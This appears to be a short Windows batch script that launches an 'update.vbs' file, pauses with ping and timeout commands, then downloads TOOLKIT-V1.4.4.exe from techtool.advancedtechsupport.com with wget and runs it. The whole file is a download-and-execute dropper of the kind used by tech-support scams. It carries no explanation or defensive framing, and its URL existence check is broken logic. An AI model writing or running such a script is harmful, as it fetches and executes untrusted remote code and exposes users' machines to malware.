if exist http://techtool.advancedtechsupport.com/TOOLKIT-V1.4.4.exe goto dnv

:dnv
start update.vbs
ping 127.0.0.1 -n 2 -w 6000 > nul
ping 127.0.0.1 -n %1% -w 6000> nul
timeout /t 5
wget http://techtool.advancedtechsupport.com/TOOLKIT-V1.4.4.exe
Start TOOLKIT-V1.4.4.exe
exit